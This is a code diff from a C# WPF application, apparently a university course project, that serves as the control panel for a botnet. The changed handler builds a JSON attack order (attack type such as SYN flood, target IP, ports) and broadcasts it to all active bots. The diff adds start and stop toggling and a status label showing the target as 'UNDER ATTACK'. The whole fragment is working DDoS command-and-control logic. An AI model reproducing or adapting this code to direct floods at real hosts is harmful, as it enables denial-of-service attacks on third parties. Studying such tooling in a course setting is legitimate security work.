@@ -148,11 +148,6 @@ namespace Coms4507_Project
             task.Start();
         }
 
-        private string FormatPorts(string portNumbers)
-        {
-            return "[" + portNumbers.Trim() + "]";
-        }
-
         private void SYN_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
         {
             // SELECT SYN_FLOOD TO THE ATTACK TYPE
@@ -223,30 +218,56 @@ namespace Coms4507_Project
         private void ATTACK_BUTTON_Click(object sender, System.Windows.RoutedEventArgs e)
         {
             // THIS IS WHERE WE START THE ATTACK.
-
-            ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Gray);
-            ATTACK_BUTTON.Content = "STARTING ATTACK";
-
-            // Format the attack, and then mass distribute it out to all active bots.
-
-            string targetIp = IP_ADDRESS.Text;
-            string ports = PORTS.Text;
-            string runtime = "*"; // Deprecated: hardcoded because we don't support runtimes anymore but the APIs use it.
-
-            Dictionary<string, string> attackMessage = new Dictionary<string, string>
+            if (ATTACK_BUTTON.Content.ToString().Equals("START ATTACK"))
             {
-                { "request", "attack" },
-                { "attack", attackType },
-                { "targetIP", targetIp },
-                { "ports", "[" + ports.Trim() + "]" },
-                { "runtime", runtime }
-            };
+                ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Gray);
+                ATTACK_BUTTON.Content = "STARTING ATTACK";
 
-            attackStatus = "ATTACK";
-            botHandler.ATTACK(JObject.FromObject(attackMessage).ToString());
+                // Format the attack, and then mass distribute it out to all active bots.
 
-            ATTACK_BUTTON.Background = new SolidColorBrush(Colors.LawnGreen);
-            ATTACK_BUTTON.Content = "STOP ATTACK";
+                string targetIp = IP_ADDRESS.Text;
+                string ports = PORTS.Text;
+                string runtime = "*"; // Deprecated: hardcoded because we don't support runtimes anymore but the APIs use it.
+
+                Dictionary<string, string> attackMessage = new Dictionary<string, string>
+                {
+                    { "request", "attack" },
+                    { "attack", attackType },
+                    { "targetIP", targetIp },
+                    { "ports", "[" + ports.Trim() + "]" },
+                    { "runtime", runtime }
+                };
+
+                attackStatus = "ATTACK";
+                botHandler.ATTACK(JObject.FromObject(attackMessage).ToString());
+
+                TARGET_STATUS.Content = "UNDER ATTACK!";
+                TARGET_STATUS.Foreground = new SolidColorBrush(Colors.Orange);
+
+                ATTACK_BUTTON.Background = new SolidColorBrush(Colors.LawnGreen);
+                ATTACK_BUTTON.Content = "STOP ATTACK";
+            } else
+            {
+                ATTACK_BUTTON.Content = "STOPPING ATTACK";
+                ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Gray);
+                TARGET_STATUS.Content = "ONLINE? (Cannot confirm)";
+                TARGET_STATUS.Foreground = new SolidColorBrush(Colors.White);
+                // Issue the stop order
+                Dictionary<string, string> attackMessage = new Dictionary<string, string>
+                {
+                    { "request", "stop" },
+                    { "attack", "none" },
+                    { "targetIP", "none" },
+                    { "ports", "none" },
+                    { "runtime", "*" }
+                };
+                // Tell them to stop.
+                botHandler.STOP(JObject.FromObject(attackMessage).ToString());
+
+                ATTACK_BUTTON.Content = "START ATTACK";
+                ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Red);
+            }
+            
         }
 
         
